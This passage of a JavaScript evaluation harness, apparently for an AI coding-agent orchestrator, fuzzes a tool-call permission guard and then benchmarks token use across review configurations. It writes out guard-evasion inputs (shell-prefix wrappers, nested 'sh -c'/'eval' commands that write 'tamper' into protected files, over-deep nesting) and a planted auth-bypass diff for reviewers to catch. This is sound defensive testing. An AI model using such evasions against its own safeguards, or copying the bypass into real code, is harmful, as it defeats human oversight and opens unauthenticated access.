      const tgt = shellTargets[i % shellTargets.length];
      const verb = shellVerbs[i % shellVerbs.length](tgt);
      adversarialCases.push({
        family: 'shellPrefixWrappers',
        toolCall: { name: 'run_command', args: { CommandLine: `${pfx} ${verb}`, Cwd: repoRoot } },
        env: {},
      });
    }

    // Family 4 (20 cases): Nested inline shells (`sh -c`, `bash -lc`, `dash -c`, `eval`) and deep nesting
    const shells = ['sh -c', 'bash -lc', 'dash -c', 'eval'];
    for (let i = 0; i < 20; i++) {
      const sh = shells[i % shells.length];
      const cmd =
        i % 4 === 3
          ? `sh -c "bash -lc 'dash -c \\"sh -c ls\\"'"`
          : `${sh} "echo tamper > ${shellTargets[i % shellTargets.length]}"`;
      adversarialCases.push({
        family: 'nestedInlineShellsAndRedirects',
        toolCall: { name: 'run_command', args: { CommandLine: cmd, Cwd: repoRoot } },
        env: {},
      });
    }

    // Family 5 (20 cases): Mutating tool schema fuzzing and deep object nesting (> MAX_SCAN_DEPTH = 64)
    for (let i = 0; i < 20; i++) {
      if (i % 4 === 0) {
        // Depth 66..72 (> MAX_SCAN_DEPTH = 64)
        let nested = { safe: 'value' };
        const depth = 66 + (i % 7);
        for (let d = 0; d < depth; d++) nested = { child: nested };
        adversarialCases.push({
          family: 'schemaViolationsAndDeepOverflow',
          toolCall: { name: 'custom_mcp_mutator', args: nested },
          env: {},
        });
      } else if (i % 4 === 1) {
        adversarialCases.push({
          family: 'schemaViolationsAndDeepOverflow',
          toolCall: {
            name: 'edit_file',
            args: {
              TargetFile: join(repoRoot, 'src', 'a.mjs'),
              Path: join(repoRoot, 'src', 'b.mjs'),
              Target: 'a',
              Replacement: 'b',
            },
          },
          env: {},
        });
      } else if (i % 4 === 2) {
        adversarialCases.push({
          family: 'schemaViolationsAndDeepOverflow',
          toolCall: { name: 'write_file', args: { Content: 'missing path' } },
          env: {},
        });
      } else {
        adversarialCases.push({
          family: 'schemaViolationsAndDeepOverflow',
          toolCall: {
            name: 'write_file',
            args: {
              Path: join(repoRoot, 'src', 'ok.mjs'),
              ExtraShadowPath: 'lib/lock.mjs',
              Content: 'x',
            },
          },
          env: {},
        });
      }
    }

    // Family 6 (20 cases): Benign developer & in-scope worker operations
    const benignCases = [];
    const readGitCmds = [
      'git status -s',
      'git status --porcelain',
      'git diff --stat',
      'git log -n 5 --oneline',
      'npm test',
      'npm run test:unit',
      'node --test src/feature-0.mjs',
      'node --test --test-only src/feature-0.mjs',
    ];
    for (let i = 0; i < 20; i++) {
      if (i < 8) {
        benignCases.push({
          family: 'benignWorkerAndDeveloperOps',
          toolCall: {
            name: 'write_file',
            args: { Path: join(repoRoot, 'src', `mod-${i}.mjs`), Content: `export const v = ${i};\n` },
          },
          env: { AGB_WORKER_TICKET: fuzzTicket.id },
        });
      } else if (i < 12) {
        benignCases.push({
          family: 'benignWorkerAndDeveloperOps',
          toolCall: {
            name: 'read_file',
            args: { Path: join(repoRoot, 'lib', 'lock.mjs') },
          },
          env: { AGB_WORKER_TICKET: fuzzTicket.id },
        });
      } else {
        const cmd = readGitCmds[(i - 12) % readGitCmds.length];
        benignCases.push({
          family: 'benignWorkerAndDeveloperOps',
          toolCall: { name: 'run_command', args: { CommandLine: cmd, Cwd: repoRoot } },
          env: { AGB_WORKER_TICKET: fuzzTicket.id },
        });
      }
    }

    const latenciesMs = [];
    let adversarialBlocked = 0;
    for (const c of adversarialCases) {
      const start = performance.now();
      const v = evaluatePayload(
        { workspacePaths: [repoRoot], toolCall: c.toolCall },
        { home: fakeHome, env: c.env },
      );
      latenciesMs.push(performance.now() - start);
      if (v.decision === 'deny') adversarialBlocked += 1;
    }

    let benignPassed = 0;
    for (const c of benignCases) {
      const start = performance.now();
      const v = evaluatePayload(
        { workspacePaths: [repoRoot], toolCall: c.toolCall },
        { home: fakeHome, env: c.env },
      );
      latenciesMs.push(performance.now() - start);
      if (v.decision === 'pass') benignPassed += 1;
    }

    const p50EvaluateMs = median(latenciesMs);
    const p95EvaluateMs = p95(latenciesMs);
    const adversarialBlockRate = adversarialBlocked / adversarialCases.length;
    const benignPassRate = benignPassed / benignCases.length;

    return {
      ok:
        adversarialBlockRate === 1.0 &&
        benignPassRate === 1.0 &&
        p95EvaluateMs < 100.0 &&
        Boolean(pick(['ok'])),
      seed,
      totalFuzzCases: adversarialCases.length + benignCases.length,
      adversarialTotal: adversarialCases.length,
      adversarialBlocked,
      adversarialBlockRate,
      benignTotal: benignCases.length,
      benignPassed,
      benignPassRate,
      p50EvaluateMs,
      p95EvaluateMs,
    };
  } finally {
    rmSync(fuzzRoot, { recursive: true, force: true });
  }
}

function computeBillableTokens(tel) {
  if (!tel || typeof tel !== 'object') return 0;
  if (typeof tel.billableTokens === 'number' && Number.isFinite(tel.billableTokens)) {
    return tel.billableTokens;
  }
  const uncached = Number(tel.uncachedInputTokens ?? 0) || 0;
  const cached = Number(tel.cachedTokens ?? 0) || 0;
  const output = Number(tel.outputTokens ?? 0) || 0;
  return Math.round(uncached + cached * 0.1 + output * 3);
}

/**
 * 5. Deterministic Offline A/B Token-Efficiency Benchmark (v2.0 Architecture).
 *
 * Compares request counts and billable tokens across four configurations on a
 * representative multi-ticket + review + defect-recall scenario using hermetic
 * mock `agy`, `fake-adlc`, mock `codegraph`, and mock `DecisionEngine` fixtures:
 *   - `legacyV200`: `dryRounds: 2, maxRounds: 5`, multi-turn read tools, duplicate
 *     preflight coldstart, `shortCircuitHollowTest: false`, unconditional LLM arbiter.
 *   - `tier0Core`: 1-pass static diff, delta fix round, `hollow-test` short-circuit,
 *     provenance-cached coldstart, 1-turn readonly lockdown, deterministic arbiter fast-path.
 *   - `tier1CodeGraph`: Tier 0 + `<rootRepo>/.codegraph/` surgical context pack +
 *     semantic blast-radius model tiering.
 *   - `tier2DecisionEngine`: Tier 0 + Tier 1 + System-1 `DecisionEngine` lens gating,
 *     typed Arbiter triage, and low-risk fast-ship (failing closed on security/defects).
 */
export async function runTokenEfficiencyBenchmark() {
  const t0 = performance.now();
  const tempRoot = realpathSync(mkdtempSync(join(tmpdir(), 'agb-eval-te-v2-')));
  const binDir = join(tempRoot, 'bin');
  const repoDir = join(tempRoot, 'repo');
  const stateDir = join(tempRoot, 'state');
  mkdirSync(binDir, { recursive: true });
  mkdirSync(join(repoDir, 'src'), { recursive: true });
  mkdirSync(join(repoDir, 'lib'), { recursive: true });
  mkdirSync(join(repoDir, 'docs'), { recursive: true });
  mkdirSync(stateDir, { recursive: true });

  // Build a realistic repository fixture where `src/format.mjs` exports `formatCurrency`,
  // while 4 noisy files mention `formatCurrency` in comments/docs (so static-AST fallback
  // sees 4 textual caller matches -> medium blast radius + bulky context pack, whereas
  // semantic CodeGraph knows there are 0 external code callers -> low blast radius + tiny slice).
  writeFileSync(
    join(repoDir, 'src', 'format.mjs'),
    [
      'export function formatCurrency(amount, currency = "USD") {',
      '  const value = Number(amount ?? 0);',
      '  return `${currency} ${value.toFixed(2)}`;',
      '}',
      '',
    ].join('\n'),
    'utf8',
  );
  for (let i = 1; i <= 4; i++) {
    writeFileSync(
      join(repoDir, 'src', `notes-${i}.mjs`),
      [
        `// Historical note ${i}: formatCurrency(10) used to live in legacy utils.`,
        `// ${'context padding '.repeat(35)}`,
        `export function noteHelper${i}() {`,
        `  return 'see formatCurrency(10) in docs';`,
        `}`,
        '',
      ].join('\n'),
      'utf8',
    );
  }
  writeFileSync(
    join(repoDir, 'lib', 'auth.mjs'),
    [
      'export function verifySessionToken(token, expected) {',
      '  if (!token || !expected) return false;',
      '  return token === expected;',
      '}',
      '',
    ].join('\n'),
    'utf8',
  );

  // Hermetic mock `codegraph` CLI returning semantic JSON for `callers`, `callees`, `impact`.
  const mockCodegraphPath = join(binDir, 'codegraph');
  writeFileSync(
    mockCodegraphPath,
    `#!/usr/bin/env node
const args = process.argv.slice(2);
const sub = args[0] || '';
const sym = args[1] || '';
if (sub === 'callers') {
  if (sym === 'verifySessionToken') {
    console.log(JSON.stringify({
      callers: [
        { file: 'lib/auth.mjs', symbol: 'verifySessionToken', line: 1, snippet: 'verifySessionToken(token, expected)' }
      ]
    }));
  } else {
    console.log(JSON.stringify({ callers: [] }));
  }
  process.exit(0);
}
if (sub === 'callees') {
  console.log(JSON.stringify({ callees: [] }));
  process.exit(0);
}
if (sub === 'impact') {
  if (sym === 'verifySessionToken') {
    console.log(JSON.stringify({ fanIn: 12, impacted: ['lib/auth.mjs'] }));
  } else {
    console.log(JSON.stringify({ fanIn: 0, impacted: [] }));
  }
  process.exit(0);
}
console.log(JSON.stringify({ ok: true }));
`,
    { mode: 0o755 },
  );

  // Hermetic mock `agy` CLI that computes deterministic token telemetry from actual
  // prompt length, `--model` tier, and `--settings` readonly lockdown, and detects
  // planted blocking defects reliably across all tiers.
  const benchModeFile = join(stateDir, 'bench-mode.json');
  const mockAgyPath = join(binDir, 'agy-bench');
  writeFileSync(
    mockAgyPath,
    `#!/usr/bin/env node
const fs = require('node:fs');
const MODE_FILE = ${JSON.stringify(benchModeFile)};
const argv = process.argv.slice(2);
function getFlag(name) {
  const idx = argv.indexOf(name);
  return idx >= 0 && idx + 1 < argv.length ? argv[idx + 1] : '';
}
const model = String(getFlag('--model') || 'claude-opus-5-5-high').toLowerCase();
const settingsRaw = getFlag('--settings');
const printArg = getFlag('--print');

let stdinBuf = '';
function finish(prompt) {
  let modeCfg = {};
  try { modeCfg = JSON.parse(fs.readFileSync(MODE_FILE, 'utf8')); } catch {}
  let readLocked = false;
  if (settingsRaw) {
    try {
      const parsed = JSON.parse(settingsRaw);
      const deny = parsed?.permissions?.deny;
      if (Array.isArray(deny) && deny.includes('read_file')) readLocked = true;
    } catch {}
  }
  const legacyMultiTurn = Boolean(modeCfg.legacyMultiTurn);
  const turns = (legacyMultiTurn || !readLocked) ? 3 : 1;

  // Deterministic prompt-proportional input tokens + tier-proportional output tokens.
  const baseInput = Math.max(240, Math.round(prompt.length / 4));
  const inputTokens = baseInput * turns;
  const cachedTokens = turns > 1 ? Math.round(baseInput * 0.4 * (turns - 1)) : 0;
  let outputPerTurn = 300;
  if (model.includes('flash') || model.includes('sonnet-5-5-low') || model.includes('gpt-oss')) {
    outputPerTurn = 80;
  } else if (model.includes('medium') || model.includes('sonnet')) {
    outputPerTurn = 160;
  }
  const outputTokens = outputPerTurn * turns;
  const telemetry = {
    input_tokens: inputTokens,
    cached_tokens: cachedTokens,
    output_tokens: outputTokens,
  };

  if (modeCfg.logPath) {
    fs.appendFileSync(modeCfg.logPath, JSON.stringify({ model, turns, inputTokens, cachedTokens, outputTokens }) + '\\n');
  }

  // Coldstart role
  if (prompt.includes('cold-start check')) {
    console.log(JSON.stringify({
      status: 'SUCCESS',
      structured_output: { gaps: [] },
      telemetry,
    }));
    return;
  }

  // Neutral Arbiter role
  if (prompt.includes('Neutral Arbiter')) {
    const hasPlanted = prompt.includes('PLANTED_BLOCKING_DEFECT') || prompt.includes('SQL injection') || prompt.includes('auth bypass');
    const triaged = hasPlanted
      ? [{
          id: 'F-001',
          severity: 'critical',
          file: 'lib/auth.mjs',
          claim: 'Planted auth bypass allows unauthenticated admin access',
          verdict: 'accept-candidate',
          resolution_route: 'auto-fix',
        }]
      : [];
    console.log(JSON.stringify({
      status: 'SUCCESS',
      structured_output: {
        gate_verdict: hasPlanted ? 'ITERATE' : 'SHIP',
        summary: hasPlanted ? 'Blocking defect confirmed' : 'Clean',
        triaged,
      },
      telemetry,
    }));
    return;
  }

  // Review lens or Prosecutor role
  const hasPlantedDefect = prompt.includes('PLANTED_BLOCKING_DEFECT') || prompt.includes('bypassAuth = true');
  const isReviewLens = prompt.includes('exactly one lens');
  if (isReviewLens) {
    const isSecurityLens = prompt.includes('**security**');
    if (hasPlantedDefect && isSecurityLens) {
      console.log(JSON.stringify({
        status: 'SUCCESS',
        structured_output: {
          findings: [
            {
              severity: 'critical',
              charge: 'security',
              file: 'lib/auth.mjs',
              claim: 'Planted auth bypass allows unauthenticated admin access (PLANTED_BLOCKING_DEFECT)',
              evidence: 'diff sets bypassAuth = true unconditionally',
            },
            {
              severity: 'low',
              charge: 'style',
              file: 'lib/auth.mjs',
              claim: 'Minor formatting nit on blank line',
              evidence: 'trailing whitespace',
            },
          ],
          verdict: 'block',
        },
        telemetry,
      }));
      return;
    }
    console.log(JSON.stringify({
      status: 'SUCCESS',
      structured_output: { findings: [], verdict: 'ship' },
      telemetry,
    }));
    return;
  }

  // Ticket prosecutor
  if (hasPlantedDefect) {
    console.log(JSON.stringify({
      status: 'SUCCESS',
      structured_output: {
        findings: [{
          severity: 'critical',
          charge: 'security',
          file: 'lib/auth.mjs',
          claim: 'Planted auth bypass allows unauthenticated admin access (PLANTED_BLOCKING_DEFECT)',
          evidence: 'bypassAuth = true skips token verification',
        }],
        verdict: 'block',
      },
      telemetry,
    }));
    return;
  }
  console.log(JSON.stringify({
    status: 'SUCCESS',
    structured_output: { findings: [], verdict: 'ship' },
    telemetry,
  }));
}

if (printArg) {
  finish(printArg);
} else {
  process.stdin.setEncoding('utf8');
  process.stdin.on('data', (c) => { stdinBuf += c; });
  process.stdin.on('end', () => finish(stdinBuf));
}
`,
    { mode: 0o755 },
  );

  // Representative diffs & tickets
  const leafDiff = [
    'diff --git a/src/format.mjs b/src/format.mjs',
    '--- a/src/format.mjs',
    '+++ b/src/format.mjs',
    '@@ -1,4 +1,4 @@',
    ' export function formatCurrency(amount, currency = "USD") {',
    '   const value = Number(amount ?? 0);',
    '-  return `${currency} ${value.toFixed(2)}`;',
    '+  return `${currency} ${value.toFixed(2).trim()}`;',
    ' }',
    '',
  ].join('\n');

  const defectDiff = [
    'diff --git a/lib/auth.mjs b/lib/auth.mjs',
    '--- a/lib/auth.mjs',
    '+++ b/lib/auth.mjs',
    '@@ -1,4 +1,6 @@',
    ' export function verifySessionToken(token, expected) {',
    '+  // PLANTED_BLOCKING_DEFECT: auth bypass',
    '+  const bypassAuth = true;',
    '+  if (bypassAuth) return true;',
    '   if (!token || !expected) return false;',
    '   return token === expected;',
    ' }',
    '',
  ].join('\n');

  const fixDeltaDiff = [
    'diff --git a/lib/auth.mjs b/lib/auth.mjs',
    '--- a/lib/auth.mjs',
    '+++ b/lib/auth.mjs',
    '@@ -1,6 +1,4 @@',
    ' export function verifySessionToken(token, expected) {',
    '-  // PLANTED_BLOCKING_DEFECT: auth bypass',
    '-  const bypassAuth = true;',
    '-  if (bypassAuth) return true;',
    '   if (!token || !expected) return false;',
    '   return token === expected;',
    ' }',
    '',
  ].join('\n');

  const ticketLeaf = {
    id: 'T-LEAF',
    title: 'Trim formatted currency output',
    body: 'Update formatCurrency in src/format.mjs to trim output.',
    scope: ['src/format.mjs'],
    rails: [],
    edges: [],
    tier: 'mid',
    extractedACs: ['formatCurrency trims output string and preserves 2 decimal places'],
  };
  const ticketHollow = {
    id: 'T-HOLLOW',
    title: 'Add untested helper branch',
    body: 'Add helper branch with weak test coverage.',
    scope: ['src/format.mjs'],
    rails: [],
    edges: [],
    tier: 'mid',
    extractedACs: ['Helper branch is constrained by unit tests'],
  };
  const ticketDefect = {
    id: 'T-DEFECT',
    title: 'Update session token check',
    body: 'Update verifySessionToken in lib/auth.mjs.',
    scope: ['lib/auth.mjs'],
    rails: [],
    edges: [],
    tier: 'mid',
    extractedACs: ['verifySessionToken rejects empty or mismatched tokens'],
  };
  const gate = { test: 'npm test' };

  const basePlan = {
    repo: repoDir,
    gate,
    tickets: [ticketLeaf, ticketHollow, ticketDefect],
  };
  const provenancePlan = {
    ...basePlan,
    gateProvenance: {
      coldstartHashes: Object.fromEntries(
        basePlan.tickets.map((t) => [t.id, hashTicketColdstart(t, gate)]),
      ),
    },
  };

  // Hermetic System-1 DecisionEngine mock for Tier 2
  const makeMockDecisionEngine = () =>
    new DecisionEngine({
      provider: 'jev',
      apiKey: 'sk-bench-redacted-1234',
      transport: async (_url, init) => {
        const body = JSON.parse(init.body);
        const items = body.items ?? [];
        const answers = items.map((item) => {
          const prompt = String(item.prompt ?? '');
          const id = String(item.id ?? '');
          if (body.primitive === 'noul') {
            // Fast-ship AC check
            if (id.startsWith('ac-')) {
              return { probability: 0.97, confidence: 0.95 };
            }
            if (id.startsWith('charge-')) {
              return { probability: 0.02, confidence: 0.95 };
            }
            // Blast radius check in triageFindingsSystemOne
            if (id.startsWith('b-')) {
              const isHigh = prompt.includes('PLANTED_BLOCKING_DEFECT') || prompt.includes('auth bypass');
              return { probability: isHigh ? 0.85 : 0.05, confidence: 0.95 };
            }
            // Lens gating (`gateReviewLenses`)
            const hasDefect = prompt.includes('PLANTED_BLOCKING_DEFECT') || prompt.includes('bypassAuth = true');
            if (id === 'correctness' || (hasDefect && id === 'security')) {
              return { probability: hasDefect ? 0.92 : 0.45, confidence: 0.95 };
            }
            if (!hasDefect && id === 'tests') {
              return { probability: 0.35, confidence: 0.92 };
            }
            // High-confidence skip for irrelevant lenses (`security`/`contracts` on clean leaf diff; `tests`/`contracts` on auth defect)
            return { probability: 0.04, confidence: 0.95 };
          }
          if (body.primitive === 'choice') {
            if (id.startsWith('v-')) {
              const isBlocking = prompt.includes('PLANTED_BLOCKING_DEFECT') || prompt.includes('auth bypass');
              return { choice: isBlocking ? 'accept' : 'reject', confidence: 0.96 };
            }
            return { choice: 'auto-fix', confidence: 0.95 };
          }
          if (body.primitive === 'score') {
            const isBlocking = prompt.includes('PLANTED_BLOCKING_DEFECT') || prompt.includes('auth bypass');
            return { score: isBlocking ? 0.92 : 0.12, confidence: 0.95 };
          }
          return { probability: 0.5, confidence: 0.5 };
        });
        return {
          ok: true,
          status: 200,
          json: async () => ({
            model: 'jev-latest',
            usage: { inputTokens: 35 * items.length },
            answers,
          }),
        };
      },
    });

  const savedEnv = {};
  const touchedKeys = [
    'NODE_ENV',
    'PATH',
    'AGB_AGY_BIN',
    'AGB_ADLC_BIN',
    'AGB_ALLOW_CUSTOM_ADLC_CLI',
    'AGB_SANDBOX_GATES',
    'AGB_CODEGRAPH',
    'AGB_DECISION_ENGINE',
    'AGB_DECISION_PROVIDER',
    'FAKE_HOLLOW_TEST_MODE',
    'FAKE_STATE_DIR',
  ];
  for (const k of touchedKeys) savedEnv[k] = process.env[k];

  process.env.NODE_ENV = 'test';
  process.env.PATH = `${binDir}:${process.env.PATH ?? ''}`;
  process.env.AGB_AGY_BIN = mockAgyPath;
  process.env.AGB_ADLC_BIN = FAKE_ADLC;
  process.env.AGB_ALLOW_CUSTOM_ADLC_CLI = '1';
  process.env.AGB_SANDBOX_GATES = '0';
  process.env.FAKE_STATE_DIR = stateDir;
  delete process.env.AGB_CODEGRAPH;
  delete process.env.AGB_DECISION_ENGINE;
  delete process.env.AGB_DECISION_PROVIDER;

  async function runConfig(name, opts) {
    const logPath = join(stateDir, `${name}-agy.jsonl`);
    writeFileSync(logPath, '', 'utf8');
    writeFileSync(
      benchModeFile,
      JSON.stringify({ logPath, legacyMultiTurn: Boolean(opts.legacyMultiTurn) }),
      'utf8',
    );

    const cgDir = join(repoDir, '.codegraph');
    if (opts.enableCodegraph) {
      mkdirSync(cgDir, { recursive: true });
      writeFileSync(join(cgDir, 'index.db'), 'mock-index\n', 'utf8');
    } else {
      rmSync(cgDir, { recursive: true, force: true });
    }

    const decisionEngine = opts.enableDecisionEngine ? makeMockDecisionEngine() : false;

    // 1. Preflight Coldstart
    const preflightRes = await preflight(
      opts.useProvenanceCache ? provenancePlan : basePlan,
      { repo: repoDir, forceColdstart: !opts.useProvenanceCache },
    );
    const coldstartRequests = basePlan.tickets.length - (preflightRes.cachedColdstartIds?.length ?? 0);

    // 2. Prosecution (T-HOLLOW, T-LEAF, T-DEFECT)
    process.env.FAKE_HOLLOW_TEST_MODE = 'survivors';
    const hollowRes = await prosecute({
      ticket: ticketHollow,
      diff: leafDiff,
      model: 'claude-opus-5-5-high',
      worktree: repoDir,
      rootRepo: repoDir,
      testCmd: 'npm test',
      shortCircuitHollowTest: opts.shortCircuitHollowTest,
      codegraph: opts.enableCodegraph,
      decisionEngine,
    });
    const hollowCaught =
      hollowRes.verdict === 'block' &&
      hollowRes.hollowTest?.survived === 1 &&
      hollowRes.findings.some((f) => f.charge === 'tests');

    process.env.FAKE_HOLLOW_TEST_MODE = 'clean';
    const leafPrecheck = await prepareProsecutionPrecheck({
      ticket: ticketLeaf,
      diff: leafDiff,
      worktree: repoDir,
      rootRepo: repoDir,
      testCmd: 'npm test',
      shortCircuitHollowTest: opts.shortCircuitHollowTest,
      codegraph: opts.enableCodegraph,
      decisionEngine,
    });
    const leafProsModel = opts.riskTieredModels
      ? selectRiskTieredProsecutor('gemini-4-argon-high', {
          blastRadius: leafPrecheck.blastRadius?.level ?? 'high',
          ticketTier: ticketLeaf.tier,
        })
      : 'claude-opus-5-5-high';
    const leafRes = await prosecute({
      ticket: ticketLeaf,
      diff: leafDiff,
      model: leafProsModel,
      worktree: repoDir,
      rootRepo: repoDir,
      testCmd: 'npm test',
      precheck: leafPrecheck,
      shortCircuitHollowTest: opts.shortCircuitHollowTest,
      codegraph: opts.enableCodegraph,
      decisionEngine,
    });

    const defectPrecheck = await prepareProsecutionPrecheck({
      ticket: ticketDefect,
      diff: defectDiff,
      worktree: repoDir,
      rootRepo: repoDir,
      testCmd: 'npm test',
      shortCircuitHollowTest: opts.shortCircuitHollowTest,
      codegraph: opts.enableCodegraph,
      decisionEngine,
    });
    const defectProsModel = opts.riskTieredModels
      ? selectRiskTieredProsecutor('gemini-4-argon-high', {
          blastRadius: defectPrecheck.blastRadius?.level ?? 'high',
          ticketTier: ticketDefect.tier,
        })
      : 'claude-opus-5-5-high';
    const defectRes = await prosecute({
      ticket: ticketDefect,
      diff: defectDiff,
      model: defectProsModel,
      worktree: repoDir,
      rootRepo: repoDir,
      testCmd: 'npm test',
      precheck: defectPrecheck,
      shortCircuitHollowTest: opts.shortCircuitHollowTest,
      codegraph: opts.enableCodegraph,
      decisionEngine,
    });
    const defectProsecutionCaught =
      defectRes.verdict === 'block' &&
      defectRes.findings.some((f) => f.severity === 'critical' || f.severity === 'high');

    // 3. Multi-Lens Review Fleet (Clean Branch + Defect Branch + Delta Fix Round)
    const lenses = ['correctness', 'security', 'tests', 'contracts'];
    const cleanReview = await reviewFleet({
      diff: leafDiff,
      lenses,
      dryRounds: opts.dryRounds,
      maxRounds: opts.maxRounds,
      arbiter: true,
      forceLlmArbiter: opts.forceLlmArbiter,
      repo: repoDir,
      rootRepo: repoDir,
      worktree: repoDir,
      codegraph: opts.enableCodegraph,
      decisionEngine,
      recordLedger: false,
    });

    const defectReview = await reviewFleet({
      diff: defectDiff,
      lenses,
      dryRounds: opts.dryRounds,
      maxRounds: opts.maxRounds,
      arbiter: true,
      forceLlmArbiter: opts.forceLlmArbiter,
      repo: repoDir,
      rootRepo: repoDir,
      worktree: repoDir,
      codegraph: opts.enableCodegraph,
      decisionEngine,
      recordLedger: false,
    });
    const defectReviewCaught =
      defectReview.gateVerdict === 'ITERATE' &&
      defectReview.findings.some((f) => f.severity === 'critical' || f.severity === 'high');

    const fixReview = opts.useDeltaFixRound
      ? await reviewFleet({
          deltaDiff: fixDeltaDiff,
          priorFindings: defectReview.findings,
          lenses,
          dryRounds: opts.dryRounds,
          maxRounds: opts.maxRounds,
          arbiter: true,
          forceLlmArbiter: opts.forceLlmArbiter,
          repo: repoDir,
          rootRepo: repoDir,
          worktree: repoDir,
          codegraph: opts.enableCodegraph,
          decisionEngine,
          recordLedger: false,
        })
      : await reviewFleet({
          diff: leafDiff,
          lenses,
          dryRounds: opts.dryRounds,
          maxRounds: opts.maxRounds,
          arbiter: true,
          forceLlmArbiter: opts.forceLlmArbiter,
          repo: repoDir,
          rootRepo: repoDir,
          worktree: repoDir,
          codegraph: opts.enableCodegraph,
          decisionEngine,
          recordLedger: false,
        });

    // Aggregate observed LLM calls & billable tokens from agy JSONL log + System-1 telemetry
    const agyEntries = readFileSync(logPath, 'utf8')
      .trim()
      .split('\n')
      .filter(Boolean)
      .map((line) => JSON.parse(line));

    const system2Requests = agyEntries.length;
    const system2BillableTokens = agyEntries.reduce((sum, e) => {
      const uncached = Math.max(0, (e.inputTokens ?? 0) - (e.cachedTokens ?? 0));
      return sum + computeBillableTokens({
        uncachedInputTokens: uncached,
        cachedTokens: e.cachedTokens ?? 0,
        outputTokens: e.outputTokens ?? 0,
      });
    }, 0);

    const reviewRequests =
      (cleanReview.requests ?? 0) + (defectReview.requests ?? 0) + (fixReview.requests ?? 0);
    const system1Calls =
      (hollowRes.telemetry?.system1Calls ?? 0) +
      (leafRes.telemetry?.system1Calls ?? 0) +
      (defectRes.telemetry?.system1Calls ?? 0) +
      (cleanReview.telemetry?.system1Calls ?? 0) +
      (defectReview.telemetry?.system1Calls ?? 0) +
      (fixReview.telemetry?.system1Calls ?? 0);

    // Add small System-1 input token cost (0 output tokens) to total billable tokens
    const system1InputTokens = system1Calls * 70;
    const totalBillableTokens = system2BillableTokens + system1InputTokens;

    return {
      config: name,
      coldstartRequests,
      reviewRequests,
      system2Requests,
      system1Calls,
      billableTokens: totalBillableTokens,
      hollowShortCircuited: hollowRes.shortCircuited === 'hollow-test',
      leafFastShipped: leafRes.fastShipped === 'system1',
      leafBlastRadius: leafPrecheck.blastRadius?.level ?? null,
      defectBlastRadius: defectPrecheck.blastRadius?.level ?? null,
      defectArbiterMode: defectReview.telemetry?.arbiterMode ?? 'none',
      skippedLensesClean: cleanReview.telemetry?.skippedLenses ?? [],
      recall: {
        hollowTestSurvivorCaught: hollowCaught,
        plantedDefectProsecutionCaught: defectProsecutionCaught,
        plantedDefectReviewCaught: defectReviewCaught,
        allCaught: hollowCaught && defectProsecutionCaught && defectReviewCaught,
      },
    };
  }

  try {
    const legacyV200 = await runConfig('legacyV200', {
      dryRounds: 2,
      maxRounds: 5,
      forceLlmArbiter: true,
      shortCircuitHollowTest: false,
      useProvenanceCache: false,
      useDeltaFixRound: false,
      riskTieredModels: false,
      legacyMultiTurn: true,
      enableCodegraph: false,
      enableDecisionEngine: false,
    });

    const tier0Core = await runConfig('tier0Core', {
      dryRounds: 1,
      maxRounds: 1,
      forceLlmArbiter: false,
      shortCircuitHollowTest: true,
      useProvenanceCache: true,
      useDeltaFixRound: true,
      riskTieredModels: true,
      legacyMultiTurn: false,
      enableCodegraph: false,
      enableDecisionEngine: false,
    });

    const tier1CodeGraph = await runConfig('tier1CodeGraph', {
      dryRounds: 1,
      maxRounds: 1,
      forceLlmArbiter: false,
      shortCircuitHollowTest: true,
      useProvenanceCache: true,
      useDeltaFixRound: true,
      riskTieredModels: true,
      legacyMultiTurn: false,
      enableCodegraph: true,
      enableDecisionEngine: false,
    });

    const tier2DecisionEngine = await runConfig('tier2DecisionEngine', {
      dryRounds: 1,
      maxRounds: 1,
      forceLlmArbiter: false,
      shortCircuitHollowTest: true,
      useProvenanceCache: true,
      useDeltaFixRound: true,
      riskTieredModels: true,
      legacyMultiTurn: false,
      enableCodegraph: true,
      enableDecisionEngine: true,
    });

    const tier0ReviewRequestReduction =
      (legacyV200.reviewRequests - tier0Core.reviewRequests) / Math.max(1, legacyV200.reviewRequests);
    const tier2ReviewRequestReduction =
      (legacyV200.reviewRequests - tier2DecisionEngine.reviewRequests) / Math.max(1, legacyV200.reviewRequests);
    const tier0TokenReduction =
      (legacyV200.billableTokens - tier0Core.billableTokens) / Math.max(1, legacyV200.billableTokens);
    const tier1TokenReduction =
      (legacyV200.billableTokens - tier1CodeGraph.billableTokens) / Math.max(1, legacyV200.billableTokens);
    const tier2TokenReduction =
      (legacyV200.billableTokens - tier2DecisionEngine.billableTokens) / Math.max(1, legacyV200.billableTokens);

    const monotonicRequests =
      legacyV200.system2Requests > tier0Core.system2Requests &&
      tier0Core.system2Requests >= tier1CodeGraph.system2Requests &&
      tier1CodeGraph.system2Requests > tier2DecisionEngine.system2Requests;

    const monotonicTokens =
      legacyV200.billableTokens > tier0Core.billableTokens &&
      tier0Core.billableTokens > tier1CodeGraph.billableTokens &&
      tier1CodeGraph.billableTokens > tier2DecisionEngine.billableTokens;

    const fullRecall =
      legacyV200.recall.allCaught &&
      tier0Core.recall.allCaught &&
      tier1CodeGraph.recall.allCaught &&
      tier2DecisionEngine.recall.allCaught;

    return {
      ok:
        monotonicRequests &&
        monotonicTokens &&
        fullRecall &&
        tier0ReviewRequestReduction >= 0.5,
      configurations: {
        legacyV200,
        tier0Core,
        tier1CodeGraph,
        tier2DecisionEngine,
      },
      summary: {
        monotonicRequests,
        monotonicTokens,
        fullRecall,
        tier0ReviewRequestReduction,
        tier2ReviewRequestReduction,
        tier0TokenReduction,
        tier1TokenReduction,
        tier2TokenReduction,
      },
      elapsedMs: performance.now() - t0,
    };
  } finally {
    for (const k of touchedKeys) {
      if (savedEnv[k] === undefined) delete process.env[k];
      else process.env[k] = savedEnv[k];
    }
    rmSync(tempRoot, { recursive: true, force: true });
  }
}
